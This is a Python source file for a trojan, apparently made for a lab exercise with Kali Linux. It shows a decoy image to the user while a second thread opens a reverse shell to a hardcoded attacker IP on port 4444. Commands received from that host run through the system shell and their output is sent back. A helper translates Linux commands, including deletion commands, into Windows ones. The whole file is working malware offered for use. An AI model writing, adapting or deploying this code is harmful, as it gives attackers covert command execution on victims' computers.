import socket
import subprocess
import os
import threading
import platform
import sys  # ✅ Needed for resource_path
from PIL import Image


def resource_path(relative_path):
    """ Get absolute path to resource, works in dev and PyInstaller exe """
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


def show_image():
    """Open the harmless image so the user sees it"""
    try:
        img_path = resource_path("hacker.jpg")  # ✅ FIX: use resource_path

        if platform.system() == "Windows":
            os.startfile(img_path)
        elif platform.system() == "Darwin":
            subprocess.Popen(["open", img_path])
        else:
            subprocess.Popen(["xdg-open", img_path])

    except Exception as e:
        print(f"Error showing image: {e}")


def translate_command(command):
    translations = {
        "ls": "dir",
        "pwd": "cd",
        "cat hosts": "type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "rm *": "del *",
        "cp *": "copy *",
        "mv *": "move *",
        "uname -a": "systeminfo",
        "whoami": "whoami",
        "id": "whoami /all",
        "df": "wmic logicaldisk get size,freespace,caption",
        "top": "tasklist",
        "ps": "tasklist",
        "uptime": "systeminfo | findstr /C:\"System Boot Time\"",
        "ifconfig": "ipconfig /all",
        "netstat": "netstat -ano",
        "arp -a": "arp -a",
        "history": "echo 'Command history is not available in Windows.'"
    }

    for key, value in translations.items():
        if command.startswith(key):
            return value
    return command


def reverse_shell():
    REMOTE_IP = "192.168.72.135"   # ✅ Put your Kali IP here
    REMOTE_PORT = 4444

    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((REMOTE_IP, REMOTE_PORT))
        client.send(b"Connected\n")
    except Exception as e:
        print(f"Error: Unable to establish a connection. {e}")
        return

    while True:
        try:
            command = client.recv(1024).decode("utf-8").strip()
            if not command:
                continue

            if command.lower() == "exit":
                client.send(b"Exiting...\n")
                break

            translated_command = translate_command(command)
            output = subprocess.run(
                translated_command, shell=True,
                capture_output=True, text=True
            )
            client.send(output.stdout.encode("utf-8") + output.stderr.encode("utf-8"))
        except Exception as e:
            client.send(f"Error executing command: {e}\n".encode("utf-8"))

    client.close()


if __name__ == "__main__":
    # Run image viewer and reverse shell in separate threads
    threading.Thread(target=show_image).start()
    threading.Thread(target=reverse_shell).start()
